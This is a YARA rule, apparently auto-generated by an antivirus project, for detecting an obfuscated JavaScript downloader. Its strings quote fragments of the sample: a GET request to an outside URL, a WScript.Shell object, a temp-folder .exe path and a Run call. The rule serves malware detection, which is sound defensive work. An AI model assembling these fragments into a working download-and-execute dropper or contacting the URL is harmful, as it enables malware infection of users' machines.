rule sig_20160401_92e3b4d6da12d5c75514ea4d0d89df07 {
  meta:
    description = "datamaliciousorder - file 20160401_92e3b4d6da12d5c75514ea4d0d89df07.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "aa3a1b1a24da5dcc1f72e95ae8883409e30d5b6f52d6a30fd9184ac2e9a51891"

  strings:
    $s1  = "LgaYu[KhtDzz](\"G\" + \"ET\", \"http://hotlinehomeappliances.com/l3ospa\", false);" fullword ascii
    $s2  = "var XpgNzk = function QlUu() {return WScript[WwwDzo](\"WScript\"+\".Shell\");}(), UytSwz = 11;" fullword ascii
    $s3  = "function PvWpz(IjmSfx, WadZc){UyAwd = UyAwd * 1; return IjmSfx - WadZc;};" fullword ascii
    $s4  = "if (LgaYu[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function NpCsn() {return XpgNzk[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"xQvN1UwLazUi.ex\" + \"e\";};" fullword ascii
    $s6  = "function TyfVie(){return QzAb + \"\";};" fullword ascii
    $s7  = "function CibEvc() {return ((ZxgPo == true) && (ZxgPo == RlSd)) ? 1 : UyAwd;};" fullword ascii
    $s8  = "function MgtGh(){return 23;};" fullword ascii
    $s9  = "function FqzZg()" fullword ascii
    $s10 = "var ZxgPo = false;" fullword ascii
    $s11 = "function GdzEr(){return WwwDzo;};" fullword ascii
    $s12 = "}while (MofQd);" fullword ascii
    $s13 = "function LaOgl(AvOzc) {var DaxTbk = (1, 2, 3, 4, 5, AvOzc); return DaxTbk;};" fullword ascii
    $s14 = "var RlSd = false;" fullword ascii
    $s15 = "RlSd = true; " fullword ascii
    $s16 = "function VeLh(UmOyf){XpgNzk[\"R\"+\"un\"](UmOyf, UyAwd, UyAwd);};" fullword ascii
    $s17 = "var KzxJfa = false;" fullword ascii
    $s18 = "ZxgPo = true; " fullword ascii
    $s19 = "return PvWpz(FueQtk, PgTgo);" fullword ascii
    $s20 = "var QomPld = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}